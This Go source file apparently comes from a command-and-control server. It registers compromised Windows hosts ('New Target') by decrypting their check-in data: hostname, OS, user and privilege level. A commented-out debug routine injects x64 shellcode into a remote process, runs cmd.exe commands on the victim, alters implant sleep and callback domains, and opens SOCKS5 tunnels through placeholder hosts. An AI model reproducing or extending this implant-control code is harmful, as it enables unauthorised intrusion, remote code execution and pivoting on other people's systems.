package core

import (
	"TeamServer/client"
	"TeamServer/cryptography"
	"TeamServer/database"
	"TeamServer/debug"
	"TeamServer/macro"
	"TeamServer/parser"
	"bufio"
	"os"
	"strconv"
)

func Getchar() {
	reader := bufio.NewReader(os.Stdin)
	reader.ReadString('\n')
}

func DebugTask(tm *TargetManager) {
	// TaskM := client.NewTaskManager(tm.Target, "bbb", nil)
	// TaskM.ListAllActiveDomain()

	// TaskM.AddNewCallBackDomain("2.example.net")
	// TaskM.DeleteCallBackDomain("2.example2.net")
	// //Getchar()
	// TaskM.DeleteCallBackDomain("2.example.net")
	// TaskM.DeleteCallBackDomain("2.example2.net")
	// //Getchar()
	// TaskM.AddNewCallBackDomain("2.example2.net")
	// TaskM.AddNewCallBackDomain("2.example2.net")
	// //Getchar()
	// TaskM.AddNewCallBackDomain("2.example2.net")
	// TaskM.DeleteCallBackDomain("2.example2.net")
	// //	Getchar()
	// TaskM.DeleteCallBackDomain("2.example2.net")
	// TaskM.DeleteCallBackDomain("2.example2.net")
	// //Getchar()
	// TaskM.AddNewCallBackDomain("2.example.net")
	// //	Getchar()
	// TaskM.AddNewCallBackDomain("2.example.net")
	// TaskM.DeleteCallBackDomain("2.example.net")
	// TaskM.DeleteCallBackDomain("2.example.net")
	// TaskM.DeleteCallBackDomain("2.example.net")
	// //Getchar()
	// TaskM.DeleteCallBackDomain("2.example211.net")
	// TaskM.DeleteCallBackDomain("2.asd.net")
	// TaskM.AddNewCallBackDomain("google.net")
	// TaskM.AddNewCallBackDomain("aaa.net")
	// TaskM.AddNewCallBackDomain("x.net")
	// TaskM.DeleteCallBackDomain("x.example211.net")
	// TaskM.DeleteCallBackDomain("AAAAAAAAAAAaa")
	// TaskM.AddNewCallBackDomain("AAAAAAAAAAAaa")

	// CalcShellCode := []byte{
	// 	0x48, 0x31, 0xff, 0x48, 0xf7, 0xe7, 0x65, 0x48, 0x8b, 0x58, 0x60, 0x48, 0x8b, 0x5b, 0x18, 0x48,
	// 	0x8b, 0x5b, 0x20, 0x48, 0x8b, 0x1b, 0x48, 0x8b, 0x1b, 0x48, 0x8b, 0x5b, 0x20, 0x49, 0x89, 0xd8,
	// 	0x8b, 0x5b, 0x3c, 0x4c, 0x01, 0xc3, 0x48, 0x31, 0xc9, 0x66, 0x81, 0xc1, 0xff, 0x88, 0x48, 0xc1,
	// 	0xe9, 0x08, 0x8b, 0x14, 0x0b, 0x4c, 0x01, 0xc2, 0x4d, 0x31, 0xd2, 0x44, 0x8b, 0x52, 0x1c, 0x4d,
	// 	0x01, 0xc2, 0x4d, 0x31, 0xdb, 0x44, 0x8b, 0x5a, 0x20, 0x4d, 0x01, 0xc3, 0x4d, 0x31, 0xe4, 0x44,
	// 	0x8b, 0x62, 0x24, 0x4d, 0x01, 0xc4, 0xeb, 0x32, 0x5b, 0x59, 0x48, 0x31, 0xc0, 0x48, 0x89, 0xe2,
	// 	0x51, 0x48, 0x8b, 0x0c, 0x24, 0x48, 0x31, 0xff, 0x41, 0x8b, 0x3c, 0x83, 0x4c, 0x01, 0xc7, 0x48,
	// 	0x89, 0xd6, 0xf3, 0xa6, 0x74, 0x05, 0x48, 0xff, 0xc0, 0xeb, 0xe6, 0x59, 0x66, 0x41, 0x8b, 0x04,
	// 	0x44, 0x41, 0x8b, 0x04, 0x82, 0x4c, 0x01, 0xc0, 0x53, 0xc3, 0x48, 0x31, 0xc9, 0x80, 0xc1, 0x07,
	// 	0x48, 0xb8, 0x0f, 0xa8, 0x96, 0x91, 0xba, 0x87, 0x9a, 0x9c, 0x48, 0xf7, 0xd0, 0x48, 0xc1, 0xe8,
	// 	0x08, 0x50, 0x51, 0xe8, 0xb0, 0xff, 0xff, 0xff, 0x49, 0x89, 0xc6, 0x48, 0x31, 0xc9, 0x48, 0xf7,
	// 	0xe1, 0x50, 0x48, 0xb8, 0x9c, 0x9e, 0x93, 0x9c, 0xd1, 0x9a, 0x87, 0x9a, 0x48, 0xf7, 0xd0, 0x50,
	// 	0x48, 0x89, 0xe1, 0x48, 0xff, 0xc2, 0x48, 0x83, 0xec, 0x20, 0x41, 0xff, 0xd6,
	// }

	// TaskM.Inject(CalcShellCode, 65192)
	// TaskM.ChangeSleep(1000, 50)
	// TaskM.ChangeSleep(4000, 50)
	// TaskM.ShellCommand("C:\\windows\\system32\\cmd.exe /c dir C:\\windows\\")
	// //Getchar()
	// TaskM.ShellCommand("C:\\windows\\system32\\cmd.exe /c C:\\windows\\system32\\system32.exe")
	// //Getchar()
	// TaskM.ShellCommand("C:\\windows\\system32\\cmd.exe /c C:\\windows\\system32\\system321.exe")
	// //Getchar()
	// TaskM.ShellCommand("C:\\windows\\system32\\cmd.exe /c C:\\windows\\system32\\tasklist.exe")
	// //Getchar()
	// TaskM.ChangeSleep(1000, 50)
	// TaskM.ChangeSleep(4000, 50)
	// TaskM.ChangeSleep(0)
	// TaskM.ChangeSleep(-1, 50)
	// TaskM.ChangeSleep(1000, 50)
	// debug.Error("ADD StartSocks5 1")
	// go TaskM.StartSocks5("www.example.com", "10443", "1080")
	// Getchar()
	// debug.Error("restart StartSocks5 1")
	// go TaskM.StartSocks5("www.example.com", "10443", "1080")
	// //Getchar()
	// debug.Error("ADD StopProxy 1")
	// TaskM.StopProxy()
	// debug.Error("restart StopProxy 1")
	// TaskM.StopProxy()
	// debug.Error("restart StopProxy 1")
	// TaskM.StopProxy()
	// //Getchar()
	// debug.Error("ADD StartSocks5 2 example1231")
	// go TaskM.StartSocks5("www.example1231.com", "10443", "1080")
	// //Getchar()
	// debug.Error("ADD StopProxy 2")
	// TaskM.StopProxy()
	// //Getchar()
	// debug.Error("ADD StartSocks5 example 443")
	// go TaskM.StartSocks5("www.example.com", "443", "1080")
	// //Getchar()
	// debug.Error("ADD StopProxy 3")
	// TaskM.StopProxy()
	// //Getchar()
	// TaskM.ChangeSleep(1)

}

func (tm *TargetManager) SaveNewRegistration() {
	// Decrypt the data
	DecodeBuffer := cryptography.DecryptData(tm.Target.MessageContainer.Payload)
	if DecodeBuffer == nil {
		debug.Error("Failed to decrypt data.")
		return
	}
	debug.Info("Decrypted Data: [%x]", DecodeBuffer)

	// Parse the decrypted data
	ParseBuffer := parser.NewParser(DecodeBuffer)
	if ParseBuffer == nil {
		debug.Error("Failed to initialize parser.")
		return
	}
	tm.Target.TargetData.HostName = string(ParseBuffer.ParseBytes())
	tm.Target.TargetData.OS = string(ParseBuffer.ParseBytes())
	tm.Target.TargetData.UserName = string(ParseBuffer.ParseBytes())
	tm.Target.TargetData.ProcessID = strconv.Itoa(ParseBuffer.ParseInt32())
	Privilege := ParseBuffer.ParseInt32()
	if Privilege == 1 {
		tm.Target.TargetData.Privilege = "High"
	} else {
		tm.Target.TargetData.Privilege = "Low"
	}
	//Clean Container
	tm.ClearMessageContainer()
	debug.Good("=========================================== | New Target | ================================================")
	debug.Good("HostName: [%s] || OS: [%s] || Domain\\UserName: [%s] || ProcessID: [%s] ||", tm.Target.TargetData.HostName, tm.Target.TargetData.OS, tm.Target.TargetData.UserName, tm.Target.TargetData.ProcessID)
	debug.Good("=========================================== | New Target | ================================================")

	DebugTask(tm)
	go client.SendClientNewTarget(&tm.Target.TargetData, macro.Brodcast, nil)

	err := database.DB.TargetSessionHandler.UpdateTargetSession(&tm.Target.TargetData)
	if err != nil {
		debug.Error(err.Error())
	}

}

func (tm *TargetManager) handleGoustRegistration() string {

	debug.Good("RID [%d] Registring Goust Target -->", tm.RID)
	tm.RegisterGoust()
	return randomIPv6() // TODO return verification

}

func (tm *TargetManager) handleRegisterNewTarget(allData string) string {

	tm.setMessageSize()
	return randomIPv6()
}

func (tm *TargetManager) RegisterGoust() {

	tm.retrieveRemainingData(macro.MacroRegisterCode)

}
